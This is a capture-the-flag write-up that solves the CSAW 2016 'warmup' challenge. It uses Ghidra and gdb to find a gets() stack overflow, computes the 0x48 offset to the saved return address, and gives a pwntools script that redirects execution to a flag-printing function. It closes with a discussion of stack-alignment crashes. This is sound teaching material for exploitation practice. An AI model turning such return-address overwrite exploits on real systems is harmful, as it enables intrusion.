# Csaw 2016 Quals Warmup

Let's take a look at the binary:

```
$    file warmup
warmup: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.24, BuildID[sha1]=ab209f3b8a3c2902e1a2ecd5bb06e258b45605a4, not stripped
$     pwn checksec warmup
[*] '/Hackery/nightmare/modules/05-bof_callfunction/csaw16_warmup/warmup'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
$    ./warmup
-Warm Up-
WOW:0x40060d
>15935728
```

So we can see that we are dealing with a 64 bit binary. When we run it, it displays an address (looks like an address from the code section of the binary, versus another section like the libc) and prompts us for input. When we look at the main function in Ghidra, we see this:

```
void main(void)

{
  char easyFunctionAddress [64];
  char input [64];
 
  write(1,"-Warm Up-\n",10);
  write(1,&DAT_0040074c,4);
  sprintf(easyFunctionAddress,"%p\n",easy);
  write(1,easyFunctionAddress,9);
  write(1,&DAT_00400755,1);
  gets(input);
  return;
}
```

So we can see that the address being printed is the address of the function `easy` (which when we look at it's address in Ghidra we see it's `0x40060d`). After that we can see it calls the function `gets`, which is a bug since it doesn't limit how much data it scans in (and since `input` can only hold `64` bytes of data, after we write `64` bytes we overflow the buffer and start overwriting other things in memory). With that bug we can totally reach the return address (the address on the stack that is executed after the `ret` call to return execution back to whatever code called it). For what to call, we see that the `easy` function will print the flag for us (in order to print the flag, we will need to have a `flag.txt` file in the same directory as the executable):

```
void easy(void)

{
  system("cat flag.txt");
  return;
}
```

So let's use gdb to figure out how much data we need to send before overwriting the return address, so we can land the bug. I will just set a breakpoint for after the `gets` call:

```
gef➤  disas main
Dump of assembler code for function main:
   0x000000000040061d <+0>:    push   rbp
   0x000000000040061e <+1>:    mov    rbp,rsp
   0x0000000000400621 <+4>:    add    rsp,0xffffffffffffff80
   0x0000000000400625 <+8>:    mov    edx,0xa
   0x000000000040062a <+13>:    mov    esi,0x400741
   0x000000000040062f <+18>:    mov    edi,0x1
   0x0000000000400634 <+23>:    call   0x4004c0 <write@plt>
   0x0000000000400639 <+28>:    mov    edx,0x4
   0x000000000040063e <+33>:    mov    esi,0x40074c
   0x0000000000400643 <+38>:    mov    edi,0x1
   0x0000000000400648 <+43>:    call   0x4004c0 <write@plt>
   0x000000000040064d <+48>:    lea    rax,[rbp-0x80]
   0x0000000000400651 <+52>:    mov    edx,0x40060d
   0x0000000000400656 <+57>:    mov    esi,0x400751
   0x000000000040065b <+62>:    mov    rdi,rax
   0x000000000040065e <+65>:    mov    eax,0x0
   0x0000000000400663 <+70>:    call   0x400510 <sprintf@plt>
   0x0000000000400668 <+75>:    lea    rax,[rbp-0x80]
   0x000000000040066c <+79>:    mov    edx,0x9
   0x0000000000400671 <+84>:    mov    rsi,rax
   0x0000000000400674 <+87>:    mov    edi,0x1
   0x0000000000400679 <+92>:    call   0x4004c0 <write@plt>
   0x000000000040067e <+97>:    mov    edx,0x1
   0x0000000000400683 <+102>:    mov    esi,0x400755
   0x0000000000400688 <+107>:    mov    edi,0x1
   0x000000000040068d <+112>:    call   0x4004c0 <write@plt>
   0x0000000000400692 <+117>:    lea    rax,[rbp-0x40]
   0x0000000000400696 <+121>:    mov    rdi,rax
   0x0000000000400699 <+124>:    mov    eax,0x0
   0x000000000040069e <+129>:    call   0x400500 <gets@plt>
   0x00000000004006a3 <+134>:    leave  
   0x00000000004006a4 <+135>:    ret    
End of assembler dump.
gef➤  b *main+134
Breakpoint 1 at 0x4006a3
gef➤  r
Starting program: /Hackery/pod/modules/bof_callfunction/csaw16_warmup/warmup
-Warm Up-
WOW:0x40060d
>15935728
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffde50  →  "15935728"
$rbx   : 0x0               
$rcx   : 0x00007ffff7dcfa00  →  0x00000000fbad2288
$rdx   : 0x00007ffff7dd18d0  →  0x0000000000000000
$rsp   : 0x00007fffffffde10  →  "0x40060d"
$rbp   : 0x00007fffffffde90  →  0x00000000004006b0  →  <__libc_csu_init+0> push r15
$rsi   : 0x35333935        
$rdi   : 0x00007fffffffde51  →  0x0038323735333935 ("5935728"?)
$rip   : 0x00000000004006a3  →  <main+134> leave
$r8    : 0x0000000000602269  →  0x0000000000000000
$r9    : 0x00007ffff7fda4c0  →  0x00007ffff7fda4c0  →  [loop detected]
$r10   : 0x0000000000602010  →  0x0000000000000000
$r11   : 0x246             
$r12   : 0x0000000000400520  →  <_start+0> xor ebp, ebp
$r13   : 0x00007fffffffdf70  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
───────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffde10│+0x0000: "0x40060d"     ← $rsp
0x00007fffffffde18│+0x0008: 0x000000000000000a
0x00007fffffffde20│+0x0010: 0x0000000000000000
0x00007fffffffde28│+0x0018: 0x0000000000000000
0x00007fffffffde30│+0x0020: 0x0000000000000000
0x00007fffffffde38│+0x0028: 0x0000000000000000
0x00007fffffffde40│+0x0030: 0x0000000000000000
0x00007fffffffde48│+0x0038: 0x0000000000000000
─────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400694 <main+119>       rex.RB ror BYTE PTR [r8-0x77], 0xc7
     0x400699 <main+124>       mov    eax, 0x0
     0x40069e <main+129>       call   0x400500 <gets@plt>
 →   0x4006a3 <main+134>       leave  
     0x4006a4 <main+135>       ret    
     0x4006a5                  nop    WORD PTR cs:[rax+rax*1+0x0]
     0x4006af                  nop    
     0x4006b0 <__libc_csu_init+0> push   r15
     0x4006b2 <__libc_csu_init+2> mov    r15d, edi
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "warmup", stopped, reason: BREAKPOINT
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4006a3 → main()
────────────────────────────────────────────────────────────────────────────────

Breakpoint 1, 0x00000000004006a3 in main ()
gef➤  search-pattern 15935728
[+] Searching '15935728' in memory
[+] In '[heap]'(0x602000-0x623000), permission=rw-
  0x602260 - 0x602268  →   "15935728"
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffde50 - 0x7fffffffde58  →   "15935728"
gef➤  i f
Stack level 0, frame at 0x7fffffffdea0:
 rip = 0x4006a3 in main; saved rip = 0x7ffff7a05b97
 Arglist at 0x7fffffffde90, args:
 Locals at 0x7fffffffde90, Previous frame's sp is 0x7fffffffdea0
 Saved registers:
  rbp at 0x7fffffffde90, rip at 0x7fffffffde98
```

With a bit of math, we see the offset:
```
>>> hex(0x7fffffffde98 - 0x7fffffffde50)
'0x48'
```

As a fun note, on some systems this offset winds up being 0x40 instead of 0x48. This means that one exploit does not fit all, and in the real world if you were exploiting a bunch of systems you'd have to do some work to figure out which exploit to throw on which target... and you'd have to worry about crashing systems and.... real world is a complicated place. 

We can also find the offset from the start of our input to the saved return address in ghidra. At the start of the function, it will display the stack layout. It will address the various variables on the stack with the offset to the saved return address. We see that `input` is addressed at `-0x48`, so it is `0x48` bytes away from the saved return address. I have seen some instances where Ghidra gets this wrong, but it is always good to know multiple ways to accomplish the same thing.

```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined main()
             undefined         AL:1           <RETURN>
             undefined1[64]    Stack[-0x48]   input                                   XREF[1]:     00400692(*)  
             undefined1[64]    Stack[-0x88]   easyFunctionAddress                     XREF[2]:     0040064d(*),
                                                                                                   00400668(*)  
                             main                                            XREF[5]:     Entry Point(*),
                                                                                          _start:0040053d(*),
                                                                                          _start:0040053d(*), 0040077c,
                                                                                          00400830(*)  
        0040061d 55              PUSH       RBP

```

So we can see that after `0x48` bytes of input, we start overwriting the return address. With all of this, we can write the exploit;
```
from pwn import *

target = process('./warmup')
gdb.attach(target, gdbscript = 'b *0x4006a3')

# Make the payload
payload = b""
payload += b"0"*0x48 # Overflow the buffer up to the return address
payload += p64(0x40060d) # Overwrite the return address with the address of the `easy` function

# Send the payload
target.sendline(payload)

target.interactive()
```

When we run it. This might crash on the `system("cat flag.txt")` if you are running it on a more modern version of libc. This is because the challenge was made to run in a different environment/libc version, and exploitation techniques that work one way in one environment work differently in others.

To learn more about the fault, use `dmesg | tail` to find information: 

```
[33123.778632] traps: warmup[19117] general protection fault ip:7f74564272d6 sp:7ffc62b86ab8 error:0 in libc-2.27.so[7f74563d8000+1e7000]
[33123.902520] warmup[19116]: segfault at 0 ip 0000000000000000 sp 00007ffc62b86c68 error 14 in warmup[400000+1000]
[33123.902536] Code: Bad RIP value.

```
This shows itself as a  general protection fault/Bad RIP value, which doesn't tell us much, but luckily, I'll tell you that this mostly means something called a "stack alignment" problem. 

"Stack alignment" basically means that the stack assumes a specific thing and that assumption isn't true so it shuts things down. 

In this specific "stack alignment" problem, the `system` call uses the instruction `movaps` with rsp as the dest address - `MOVAPS xmmword ptr [RSP + 0x50],XMM0`. If you get deeeeeep in the documentation you will find that the dest address of `movaps` must be a divisor of 16 or there will be a stack alignment fault. This is a good writeup on this fault: <https://research.csiro.au/tsblog/debugging-stories-stack-alignment-matters/>

If it does crash (and it probably will on a modern system) verify the location of the crash in the `easy` function by running the program in GDB with the payload. To generate the payload we can print the output to a file.

```
f = open("payload", "wb")
f.write(payload)
f.close()
```

We can get that input into the program using GDB to verify.

```
$   gdb -q ./warmup 
gef➤  b *main+134
Breakpoint 1 at 0x4006a3
gef➤  run < warmupPayload 
Starting program: /home/devey/Documents/github/nightmare/modules/04-Overflows/05-bof_callfunction/csaw16_warmup/warmup < payload
-Warm Up-
WOW:0x40060d
>
gef➤ ni
gef➤ ni


```

We should now see that we are in the easy function, but things are going to break and the flag won't be read. There are ways to work around this (one of which you'll learn in the next section)

It's lame to not solve a problem, but it's a much more important lesson to learn that different libc's exist, stack alignment exists, and it can be exceptionally difficult to identify what is wrong. 

Moral of the story to take away here is that computers are hard and sometimes things just wind up not being exploitable in the same way across systems.
